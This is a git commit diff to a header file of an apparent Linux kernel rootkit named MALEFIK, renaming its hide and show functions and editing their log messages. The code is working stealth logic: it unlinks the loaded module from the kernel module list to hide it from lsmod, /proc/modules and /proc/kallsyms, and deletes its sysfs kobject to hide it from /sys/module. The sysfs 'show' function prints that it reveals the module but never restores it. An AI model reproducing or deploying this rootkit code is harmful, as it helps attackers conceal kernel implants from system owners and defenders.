396e4b58cdb6ef7d4162c57cd09808388e8a6be6
Kr0dÿ <91196264+Retr0Kr0dy@users.noreply.github.com>
2023-04-03 13:39:49 +0200

    Update hide_show_helper.h

--- rvg/include/hide_show_helper.h
+++ rvg/include/hide_show_helper.h
@@ -9,57 +9,61 @@ static struct list_head *prev_module_in_proc_modules_lsmod;
 int is_hidden_proc = 0;
 int is_hidden_sys = 0;
 
-static void proc_lsmod_malefik_hide(void)
+static void proc_lsmod_hide_rootkit(void)
 {
 	if (is_hidden_proc)
 	{
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already hidden from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
 		return;
 	}
+
 	prev_module_in_proc_modules_lsmod = THIS_MODULE->list.prev;
+
 	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding LKM from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
+
 	list_del(&THIS_MODULE->list);
 
 	is_hidden_proc = 1;
 }
 
-static void sys_module_malefik_hide(void)
+
+static void sys_module_hide_rootkit(void)
 {
         if (is_hidden_sys)
         {
-        	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already hidden from `/sys/module/malefik/` directory \n");
+        	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already hidden from `/sys/module/<THIS_MODULE>/` directory \n");
                 return;
         }
 
-        printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding LKM from `/sys/module/malefik/` directory \n");
+        printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding LKM from `/sys/module/<THIS_MODULE>/` directory \n");
 
  	kobject_del(&THIS_MODULE->mkobj.kobj);
         is_hidden_sys = 1;
 }
 
-static void proc_lsmod_malefiik_show(void)
+static void proc_lsmod_show_rootkit(void)
 {
 	if (!is_hidden_proc)
 	{
 		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already revealed to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
 		return;
 	}
-	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ revealing LKM to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
+	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ revealing to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
+
 	list_add(&THIS_MODULE->list, prev_module_in_proc_modules_lsmod);
 	
 	is_hidden_proc = 0;
 }
 
-
-static void sys_module_malefik_show(void)
+static void sys_module_show_rootkit(void)
 {
 	if (!is_hidden_sys)
 	{
-		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM already revealed to `/sys/module/malefik/` directory \n");
+		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already revealed to `/sys/module/<THIS_MODULE>/` directory \n");
 		return;
 	}
 
-	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ revealing LKM to `/sys/module/malefik/` directory \n");
+	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ revealing LKM to `/sys/module/<THIS_MODULE>/` directory \n");
 	is_hidden_sys = 0;
 }
 
